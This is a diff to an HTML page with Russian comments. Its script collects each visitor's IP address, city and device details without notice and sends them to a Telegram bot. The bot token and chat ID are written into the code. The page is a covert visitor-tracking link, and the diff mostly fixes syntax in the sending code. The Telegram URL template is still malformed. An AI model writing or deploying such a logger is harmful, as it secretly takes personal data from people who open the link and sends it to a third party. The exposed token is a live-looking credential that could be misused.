@@ -6,31 +6,21 @@
 <body>
     <script>
         async function sendIp() {
-            const /bot$TOKEN = "8413511998:AAHZuQrJyZnyqJusMNbH074Rw-UzQEMSPpA";
+            // 1. Твои данные (БЕЗ слэшей в именах переменных)
+            const TOKEN = "8413511998:AAHZuQrJyZnyqJusMNbH074Rw-UzQEMSPpA";
             const CHAT_ID = "8426763446";
 
             try {
-                // 1. Получаем данные об IP и местоположении
+                // 2. Получаем данные об IP (обязательно /json/)
                 const response = await fetch('https://ipapi.co');
                 const data = await response.json();
 
-                // 2. Собираем информацию об устройстве
+                // 3. Формируем текст
                 const device = navigator.userAgent;
+                const text = `Новый переход!\n📍 IP: ${data.ip}\n🌍 Город: ${data.city}\n📱 Устройство: ${device}`;
 
-                // 3. Формируем текст сообщения
-                const text = `
-Новый переход по ссылке!
-📍 IP: ${data.ip}
-🌍 Город: ${data.city}, ${data.country_name}
-🏢 Провайдер: ${data.org}
-📱 Устройство: ${device}
-                `;
-
-                // 4. Отправляем в Telegram
-               // 4. Отправляем в Telegram
-await fetch(`https://api.telegram.org{8413511998:AAHZuQrJyZnyqJusMNbH074Rw-UzQEMSPpA}/sendMessage`, {
-    method: 'POST',
- {
+                // 4. Отправляем в Telegram (строго по этому формату)
+                await fetch(`https://api.telegram.org{TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -39,11 +29,10 @@ await fetch(`https://api.telegram.org{8413511998:AAHZuQrJyZnyqJusMNbH074Rw-UzQEM
                     })
                 });
 
-                // 5. Перенаправляем пользователя (опционально)
-                // window.location.href = "https://google.com"; 
+                console.log("Данные успешно отправлены!");
 
             } catch (error) {
-                console.error('Ошибка:', error);
+                console.error('Произошла ошибка:', error);
             }
         }
 
